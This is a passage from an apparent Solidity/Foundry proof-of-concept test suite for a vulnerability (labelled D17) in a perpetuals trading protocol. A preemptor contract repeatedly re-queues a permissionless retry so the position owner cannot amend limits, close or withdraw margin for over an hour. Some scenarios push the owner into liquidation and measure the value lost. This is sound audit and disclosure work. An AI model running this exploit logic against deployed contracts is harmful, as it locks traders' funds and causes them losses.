        uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory executionData = _mockPythUpdateData(LONG_TAKE_PROFIT);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryOrderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "the amended retry must execute");
        (uint256 remainingSize,,,,,,) = engine.positions(address(ownerAccount));
        assertEq(remainingSize, 0, "the atomic owner closed the protected position");
    }

    /// @custom:poc-control kind=NECESSITY
    /// The attacker's transaction MINUS the retry: the same party terminalises the
    /// expired child, and nobody re-queues. The owner's amendment then SUCCEEDS,
    /// which shows the permissionless retry -- not the latch itself -- is what
    /// denies the owner. Expected to PASS on both the unpatched and patched code.
    function test_control_NecessityWithoutRetryTheOwnerAmends() public {
        (uint64 protectionId, uint64 firstAttemptId) = _armAndTriggerWithTightLimits(OWNER);
        _warpPastDeadline(firstAttemptId);

        vm.prank(address(preemptor));
        router.executeOrder(firstAttemptId, new bytes[](0));
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "terminalisation alone leaves the protection Latched"
        );

        PositionProtectionTypes.CloseFinancialLimits memory wanted = _permissiveLimits();
        vm.prank(OWNER);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, wanted);
        PositionProtectionTypes.CloseFinancialLimits memory stored = protectionViews.closeFinancialLimits(protectionId);
        assertEq(stored.maxExecutionNotionalAssets, wanted.maxExecutionNotionalAssets, "notional ceiling amended");
        assertEq(stored.maxGrossAccountDebitAssets, wanted.maxGrossAccountDebitAssets, "debit ceiling amended");
        assertEq(stored.maxActionChargeAssets, wanted.maxActionChargeAssets, "action-charge ceiling amended");
        assertEq(stored.maxExplicitFeesAssets, wanted.maxExplicitFeesAssets, "fee ceiling amended");
    }

    // ------------------------------------------------------------------
    // STAGE 3 -- one-hour threshold, frozen amount, add-margin decomposition
    // ------------------------------------------------------------------

    uint256 internal constant HOUR_ROUNDS = 60; // 60 x (window + 1) = 60 x 61 s = 3,660 s

    /// @notice 60 consecutive denial rounds (> 1 hour). In every round the owner's amendment and
    ///         ordinary close are refused, and the position margin cannot be withdrawn. Free
    ///         settlement above the locked margin stays withdrawable, so the frozen amount is
    ///         exactly the position margin.
    function test_D17_OneHour_PositionMarginFrozen() public {
        (uint64 protectionId, uint64 attemptId) = _armAndTriggerWithTightLimits(OWNER);
        PositionProtectionTypes.CloseFinancialLimits memory wanted = _permissiveLimits();
        uint256 start = vm.getBlockTimestamp();
        uint256 margin = _positionMargin(OWNER);
        for (uint256 round; round < HOUR_ROUNDS; ++round) {
            _warpPastDeadline(attemptId);
            attemptId = preemptor.latchAndPreempt(address(router), address(protectionBook), attemptId, protectionId);
            vm.prank(OWNER);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, wanted);
            // full exit-route and withdrawal-boundary check at the first, middle and last round
            if (round == 0 || round == HOUR_ROUNDS / 2 - 1 || round == HOUR_ROUNDS - 1) {
                _refreshMark(LONG_TAKE_PROFIT);
                _assertOwnerHasNoOtherExit(protectionId);
                uint256 b = _settlementBalance(OWNER);
                uint256 l = clearinghouse.lockedMarginAssets(OWNER);
                vm.prank(OWNER);
                vm.expectRevert();
                clearinghouse.withdraw(OWNER, b - l + 1);
                emit log_named_uint("full exit check passed at round", round + 1);
            }
        }
        uint256 elapsed = vm.getBlockTimestamp() - start;
        assertGe(elapsed, 1 hours, "denial exceeds one hour");

        _refreshMark(LONG_TAKE_PROFIT);
        _assertOwnerHasNoOtherExit(protectionId);
        (uint256 size,,,,,,) = engine.positions(OWNER);
        assertEq(size, POSITION_SIZE, "position still open after one hour");

        uint256 bal = _settlementBalance(OWNER);
        uint256 locked = clearinghouse.lockedMarginAssets(OWNER);
        emit log_named_uint("elapsed seconds", elapsed);
        emit log_named_uint("position margin (engine)", margin);
        emit log_named_uint("clearinghouse locked margin", locked);
        emit log_named_uint("settlement balance", bal);
        assertGt(locked, 0);

        // one atom of the locked margin cannot leave
        vm.prank(OWNER);
        vm.expectRevert();
        clearinghouse.withdraw(OWNER, bal - locked + 1);
        // everything above it can
        vm.prank(OWNER);
        clearinghouse.withdraw(OWNER, bal - locked);
        // the withdrawal checkpoints carry first, so the residue is the locked margin less accrued carry
        uint256 residue = _settlementBalance(OWNER);
        emit log_named_uint("residue after max withdrawal", residue);
        assertLe(residue, locked, "only the locked margin remains");
        assertGe(residue, locked - 1e6, "carry checkpoint moved < 1 USDG");
        vm.prank(OWNER);
        vm.expectRevert();
        clearinghouse.withdraw(OWNER, 1);
    }

    function _thinPathRound(uint256 round, uint256 rounds) internal pure returns (uint256) {
        return STOP_LOSS_PRICE + ((LIQUIDATION_MARK_PRICE - STOP_LOSS_PRICE) * (round + 1)) / rounds;
    }

    /// @notice Scenario A over one hour: same thin stop loss, price walks 1.005 -> 1.02 across 60 rounds.
    function test_D17_A60_AttackLiquidation() public {
        (uint64 protectionId, uint64 attemptId) = _armThinStopLoss();
        uint256 start = vm.getBlockTimestamp();
        PositionProtectionTypes.CloseFinancialLimits memory wanted = _permissiveLimits();
        uint256 firstLiquidatableRound = type(uint256).max;
        for (uint256 round; round < HOUR_ROUNDS; ++round) {
            _warpPastDeadline(attemptId);
            attemptId = preemptor.latchAndPreempt(address(router), address(protectionBook), attemptId, protectionId);
            vm.prank(THIN_OWNER);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, wanted);
            uint256 p = _thinPathRound(round, HOUR_ROUNDS);
            _refreshMark(p);
            if (firstLiquidatableRound == type(uint256).max && engineLens.previewLiquidation(THIN_OWNER, p).liquidatable) {
                firstLiquidatableRound = round;
            }
        }
        emit log_named_uint("A60: elapsed seconds", vm.getBlockTimestamp() - start);
        emit log_named_uint("A60: first liquidatable round", firstLiquidatableRound);
        address[] memory accounts = new address[](1);
        accounts[0] = THIN_OWNER;
        bytes[] memory updateData = _liquidationData(LIQUIDATION_MARK_PRICE);
        vm.prank(LIQUIDATION_KEEPER);
        IPerpsKeeper(address(router)).executeLiquidationBatch(accounts, updateData);
        (uint256 size,,,,,,) = engine.positions(THIN_OWNER);
        assertEq(size, 0, "liquidated");
        emit log_named_uint("A60: final settlement balance", _settlementBalance(THIN_OWNER));
        emit log_named_uint("A60: trader claim balance", engine.traderClaimBalanceAssets(THIN_OWNER));
    }

    /// @notice Scenario C: the attack runs for the same hour, but the owner adds all free
    ///         settlement as margin at the first denial (CfdEngine.addMargin is not gated by the
    ///         protection). Liquidation is averted, the exposure is not. When the attacker stops,
    ///         the owner amends and exits at the end-of-path price. B - C is the cost of the
    ///         exposure the owner could not exit; C - A is the liquidation penalty add-margin avoids.
    function test_D17_C60_AddMarginAvertsLiquidationNotExposure() public {
        (uint64 protectionId, uint64 attemptId) = _armThinStopLoss();
        PositionProtectionTypes.CloseFinancialLimits memory wanted = _permissiveLimits();

        _warpPastDeadline(attemptId);
        attemptId = preemptor.latchAndPreempt(address(router), address(protectionBook), attemptId, protectionId);
        uint256 free = _settlementBalance(THIN_OWNER) - clearinghouse.lockedMarginAssets(THIN_OWNER);
        vm.prank(THIN_OWNER);
        engine.addMargin(THIN_OWNER, free - 1e6); // keep 1 USDG for close costs
        emit log_named_uint("C60: margin added during the denial", free - 1e6);
        _refreshMark(_thinPathRound(0, HOUR_ROUNDS));

        for (uint256 round = 1; round < HOUR_ROUNDS; ++round) {
            _warpPastDeadline(attemptId);
            attemptId = preemptor.latchAndPreempt(address(router), address(protectionBook), attemptId, protectionId);
            vm.prank(THIN_OWNER);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, wanted);
            uint256 p = _thinPathRound(round, HOUR_ROUNDS);
            _refreshMark(p);
            assertFalse(engineLens.previewLiquidation(THIN_OWNER, p).liquidatable, "add-margin keeps it solvent");
        }

        // attacker stops: an honest keeper expires the child, the owner amends, any retry exits.
        _warpPastDeadline(attemptId);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attemptId, new bytes[](0));
        vm.prank(THIN_OWNER);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, wanted);
        vm.prank(THIRD_PARTY);
        uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory executionData = _mockPythUpdateData(LIQUIDATION_MARK_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryOrderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "owner exits after the denial");
        (uint256 size,,,,,,) = engine.positions(THIN_OWNER);
        assertEq(size, 0);
        emit log_named_uint("C60: final settlement balance", _settlementBalance(THIN_OWNER));
        emit log_named_uint("C60: trader claim balance", engine.traderClaimBalanceAssets(THIN_OWNER));
    }

    // ------------------------------------------------------------------
    // STAGE 3b -- total trader value, all three scenarios in one test
    // ------------------------------------------------------------------

    struct TraderValue {
        uint256 wallet;
        uint256 settlement;
        uint256 traderClaim;
        uint256 unsettledCarry;
        uint256 lockedMargin;
        uint256 positionSize;
        uint256 total;
    }

    /// @dev Every per-account value bucket the trader can own or owe: wallet USDG, clearinghouse
    ///      settlement (which contains all locked/reserved sub-buckets), the engine's deferred trader
    ///      claim, minus unsettled carry debt. Position must be closed so no unrealised PnL remains.
    function _traderValue(address a, string memory tag) internal returns (TraderValue memory v) {
        v.wallet = settlementToken.balanceOf(a);
        v.settlement = _settlementBalance(a);
        v.traderClaim = engine.traderClaimBalanceAssets(a);
        v.unsettledCarry = engine.unsettledCarryAssets(a);
        v.lockedMargin = clearinghouse.lockedMarginAssets(a);
        (v.positionSize,,,,,,) = engine.positions(a);
        v.total = v.wallet + v.settlement + v.traderClaim - v.unsettledCarry;
        emit log_named_string("scenario", tag);
        emit log_named_uint("  wallet USDG", v.wallet);
        emit log_named_uint("  clearinghouse settlement", v.settlement);
        emit log_named_uint("  engine trader claim", v.traderClaim);
        emit log_named_uint("  unsettled carry (debt)", v.unsettledCarry);
        emit log_named_uint("  locked margin", v.lockedMargin);
        emit log_named_uint("  TOTAL trader value", v.total);
        assertEq(v.positionSize, 0, "position closed: no unrealised PnL outside the buckets");
        assertEq(v.lockedMargin, 0, "nothing still locked");
    }

    function _runControlB() internal returns (TraderValue memory) {
        (uint64 protectionId, uint64 attemptId) = _armThinStopLoss();
        _warpPastDeadline(attemptId);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attemptId, new bytes[](0));
        vm.prank(THIN_OWNER);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _permissiveLimits());
        vm.prank(THIRD_PARTY);
        uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory executionData = _mockPythUpdateData(STOP_LOSS_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryOrderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        return _traderValue(THIN_OWNER, "B control: amend at first latch, exit at stop loss");
    }

    function _denyRounds(uint64 protectionId, uint64 attemptId, uint256 fromRound)
        internal
        returns (uint64)
    {
        PositionProtectionTypes.CloseFinancialLimits memory wanted = _permissiveLimits();
        for (uint256 round = fromRound; round < HOUR_ROUNDS; ++round) {
            _warpPastDeadline(attemptId);
            attemptId = preemptor.latchAndPreempt(address(router), address(protectionBook), attemptId, protectionId);
            vm.prank(THIN_OWNER);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, wanted);
            _refreshMark(_thinPathRound(round, HOUR_ROUNDS));
        }
        return attemptId;
    }

    function _runAttackA60() internal returns (TraderValue memory) {
        (uint64 protectionId, uint64 attemptId) = _armThinStopLoss();
        _denyRounds(protectionId, attemptId, 0);
        address[] memory accounts = new address[](1);
        accounts[0] = THIN_OWNER;
        bytes[] memory updateData = _liquidationData(LIQUIDATION_MARK_PRICE);
        vm.prank(LIQUIDATION_KEEPER);
        IPerpsKeeper(address(router)).executeLiquidationBatch(accounts, updateData);
        return _traderValue(THIN_OWNER, "A60 attack: owner passive, liquidated");
    }

    function _runAttackC60() internal returns (TraderValue memory) {
        (uint64 protectionId, uint64 attemptId) = _armThinStopLoss();
        _warpPastDeadline(attemptId);
        attemptId = preemptor.latchAndPreempt(address(router), address(protectionBook), attemptId, protectionId);
        uint256 free = _settlementBalance(THIN_OWNER) - clearinghouse.lockedMarginAssets(THIN_OWNER);
        vm.prank(THIN_OWNER);
        engine.addMargin(THIN_OWNER, free - 1e6);
        _refreshMark(_thinPathRound(0, HOUR_ROUNDS));
        attemptId = _denyRounds(protectionId, attemptId, 1);
        _warpPastDeadline(attemptId);
        vm.prank(EXECUTION_KEEPER);
        router.executeOrder(attemptId, new bytes[](0));
        vm.prank(THIN_OWNER);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _permissiveLimits());
        vm.prank(THIRD_PARTY);
        uint64 retryOrderId = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory executionData = _mockPythUpdateData(LIQUIDATION_MARK_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(retryOrderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed));
        return _traderValue(THIN_OWNER, "C60 attack: owner adds margin, exits after the hour");
    }

    /// @notice B, A60 and C60 from the same starting state, compared on total trader value.
    function test_D17_TotalTraderValue_ThreeScenarios() public {
        uint256 snap = vm.snapshotState();
        TraderValue memory b = _runControlB();
        vm.revertToState(snap);
        TraderValue memory a = _runAttackA60();
        vm.revertToState(snap);
        TraderValue memory c = _runAttackC60();

        emit log_named_uint("B - A (total value lost, passive owner)", b.total - a.total);
        emit log_named_uint("B - C (exposure loss, owner adds margin)", b.total - c.total);
        emit log_named_uint("C - A (liquidation penalty avoided by add-margin)", c.total - a.total);
        assertGt(b.total, c.total, "denial costs the owner even with add-margin");
        assertGt(c.total, a.total, "add-margin only avoids the liquidation penalty");
        assertGt(b.total - c.total, 20 * (c.total - a.total), "exposure loss dominates the avoidable part");
    }

    // ------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------

    function _assertOwnerHasNoOtherExit(
        uint64 protectionId
    ) private {
        // Both arguments are materialised first: they read the Router and the
        // Engine, and a staticcall made after `expectRevert` would be taken for
        // the call under test.
        OrderV3Types.OrderRequest memory closeRequest = _ordinaryCloseRequest();
        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);

        // Ordinary commits -- including an ordinary close -- are refused while
        // any protection is active.
        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(closeRequest);

        // Cancellation, replacement and cancel-and-close all require
        // PendingOpen or Armed; a latched or re-triggered protection is neither.
        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.replacePositionProtection(protectionId, params);

        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, closeRequest);
    }

    /// @dev A thin LONG with a stop loss just above the mark, and a close ceiling
    ///      low enough that no retry can execute until the owner raises it.
    function _armThinStopLoss() private returns (uint64 protectionId, uint64 linkedOrderId) {
        _fundTrader(THIN_OWNER, THIN_FUNDING_ASSETS);
        _open(THIN_OWNER, CfdTypes.Side.LONG, THIN_POSITION_SIZE, THIN_MARGIN_ASSETS, MARK_PRICE);

        PositionProtectionTypes.PositionProtectionParams memory params = _params(0, STOP_LOSS_PRICE);
        params.closeLimits.maxExecutionNotionalAssets = 1e6;
        vm.prank(THIN_OWNER);
        protectionId = protectionActions.createPositionProtection(params);

        _refreshMark(STOP_LOSS_PRICE);
        _mockPythUpdateData(STOP_LOSS_PRICE);
        bytes[] memory updateData = _liveExecutionData(STOP_LOSS_PRICE);
        vm.prank(TRIGGER_KEEPER);
        linkedOrderId = protectionActions.triggerPositionProtection(protectionId, updateData);
    }

    /// @dev A bounded open through the production `commitOrder(OrderRequest)`
    ///      surface, with no Router prank and no Engine call.
    function _commitPublicOpen(
        address account
    ) private returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId = bytes32("poc-d17-public-open");
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = POSITION_MARGIN_ASSETS;
        request.targetPrice = MARK_PRICE;
        request.isClose = false;
        request.bounds.submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        request.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;

        orderId = router.nextCommitId();
        vm.prank(account);
        assertEq(router.commitOrder(request), orderId, "public commit must take the predicted id");
    }

    function _positionMargin(
        address account
    ) private view returns (uint256 marginAssets) {
        (, marginAssets,,,,,) = engine.positions(account);
    }

    function _liquidationData(
        uint256 price
    ) private returns (bytes[] memory data) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), 0));
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _armAndTriggerWithTightLimits(
        address account
    ) private returns (uint64 protectionId, uint64 linkedOrderId) {
        _open(account, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        params.closeLimits.maxExecutionNotionalAssets = _tightNotionalCeiling();

        if (account == address(ownerAccount)) {
            protectionId = ownerAccount.createProtection(address(protectionBook), params);
        } else {
            vm.prank(account);
            protectionId = protectionActions.createPositionProtection(params);
        }

        _mockPythUpdateData(LONG_TAKE_PROFIT);
        bytes[] memory updateData = _liveExecutionData(LONG_TAKE_PROFIT);
        vm.prank(TRIGGER_KEEPER);
        linkedOrderId = protectionActions.triggerPositionProtection(protectionId, updateData);
    }

    /// @dev One atom below the notional the close would actually need, which is
    ///      the ceiling the owner has to raise.
    function _tightNotionalCeiling() private pure returns (uint256) {
        return ((POSITION_SIZE * LONG_TAKE_PROFIT) / 1e20) - 1;
    }

    function _warpPastDeadline(
        uint64 orderId
    ) private {
        uint64 deadline = router.lifecycleBook().orderTiming(orderId).executionDeadline;
        assertGt(deadline, vm.getBlockTimestamp(), "fixture requires a live attempt before expiry");
        vm.warp(uint256(deadline) + 1);
    }

    function _permissiveLimits() private pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _params(
        uint256 takeProfit,
        uint256 stopLoss
    ) private pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params.takeProfitTriggerPrice = takeProfit;
        params.stopLossTriggerPrice = stopLoss;
        params.closeLimits = _permissiveLimits();
    }

    function _ordinaryCloseRequest() private returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = bytes32("poc-d17-ordinary-close");
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = 0;
        request.targetPrice = engine.CAP_PRICE();
        request.isClose = true;
        request.bounds.submitBy = uint64(vm.getBlockTimestamp());
        request.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        request.bounds.allowedExecutionModes = 7;
        request.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        request.bounds.maxExecutionBountyAssets = type(uint256).max;
        request.bounds.maxExecutionNotionalAssets = type(uint256).max;
        request.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        request.bounds.maxActionChargeAssets = type(uint256).max;
        request.bounds.maxExplicitFeesAssets = type(uint256).max;
        request.bounds.maxPostPositionSize = type(uint256).max;
        request.bounds.maxPostLeverageBps = type(uint32).max;
    }

    function _refreshMark(
        uint256 price
    ) private {
        if (vm.getBlockTimestamp() <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_liveExecutionData(price));
    }

    function _liveExecutionData(
        uint256 price
    ) private returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, vm.getBlockTimestamp(), previous)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

}
```
